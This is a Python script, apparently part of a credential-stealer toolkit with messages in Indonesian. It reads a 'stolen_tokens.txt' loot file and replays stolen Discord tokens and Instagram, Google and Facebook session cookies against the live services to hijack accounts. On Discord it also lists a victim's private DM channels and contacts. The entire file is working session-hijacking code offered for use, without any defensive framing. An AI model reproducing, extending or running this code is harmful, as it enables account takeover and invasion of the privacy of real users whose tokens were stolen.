import requests
import os
import re

LOOT_FILE = "loot/stolen_tokens.txt"

def choose_target():
    print("\n[🎯] Pilih target untuk replay:")
    print("[1] Discord")
    print("[2] Instagram")
    print("[3] Google Drive")
    print("[4] Facebook")
    return input("Pilihan anda: ").strip()

def extract_token(service_name):
    with open(LOOT_FILE, "r") as f:
        lines = f.readlines()
        for line in lines:
            if service_name in line.lower():
                if "CLIPBOARD:" in line:  # From clipboard module
                    token = line.strip().split("CLIPBOARD: ")[1]
                    return token
                else:
                    parts = line.strip().split("\t")
                    if len(parts) == 3:
                        return parts[2]
    return None

def replay_discord(token):
    print(f"[💬] Replaying Discord session menggunakan token: {token[:20]}...")
    headers = {"Authorization": token}
    r = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
    if r.status_code == 200:
        print(f"[✅] Retrieved {len(r.json())} DM channels.")
        for dm in r.json():
            name = dm.get("recipients", [{}])[0].get("username", "Unknown")
            last_msg_id = dm.get("last_message_id")
            print(f"  • DM with {name} (Last Message ID: {last_msg_id})")
    else:
        print("[❌] Token  tidak valid atau kadaluarsa.")

def replay_instagram(sessionid):
    print(f"[📸] Replaying Instagram session...")
    cookies = {"sessionid": sessionid}
    r = requests.get("https://www.instagram.com/accounts/edit/", cookies=cookies)
    if "email" in r.text:
        print("[✅] Sesi valid. Anda sudah masuk.")
    else:
        print("[❌] Token  tidak valid atau kadaluarsa.")

def replay_gdrive(sid):
    print("[📁] Listing Google Drive files (experimental)...")
    cookies = {"SID": sid}
    headers = {"User-Agent": "Mozilla/5.0"}
    r = requests.get("https://drive.google.com/drive/my-drive", cookies=cookies, headers=headers)
    if "drive_main_page" in r.text:
        print("[✅] Tampaknya masuk ke GDrive. (Konfirmasi visual)")
    else:
        print("[❌] Akses diblokir. Token kemungkinan tidak valid atau Google juga memerlukan SAPISID.")

def replay_facebook(fb_cookie):
    print("[👥] Accessing Facebook profile...")
    cookies = {"c_user": fb_cookie}
    r = requests.get("https://m.facebook.com/me", cookies=cookies)
    if "logout" in r.text.lower():
        print("[✅] Masuk Facebook mobile view.")
    else:
        print("[❌] Sesi diblokir atau kedaluwarsa.")

def run():
    choice = choose_target()
    if choice == "1":
        token = extract_token("discord.com")
        if token:
            replay_discord(token)
        else:
            print("[!] Tidak ada Discord token yang ditemukan.")
    elif choice == "2":
        token = extract_token("instagram.com")
        if token:
            replay_instagram(token)
        else:
            print("[!] Tidak ada Instagram sessionid yang ditemukan.")
    elif choice == "3":
        token = extract_token("google.com")
        if token:
            replay_gdrive(token)
        else:
            print("[!] Tidak ada Google SID token yang ditemukan.")
    elif choice == "4":
        token = extract_token("facebook.com")
        if token:
            replay_facebook(token)
        else:
            print("[!] Tidak ada Facebook cookie yang ditemukan.")
    else:
        print("[!] Pilihan tidak valid.")

if __name__ == "__main__":
    run()
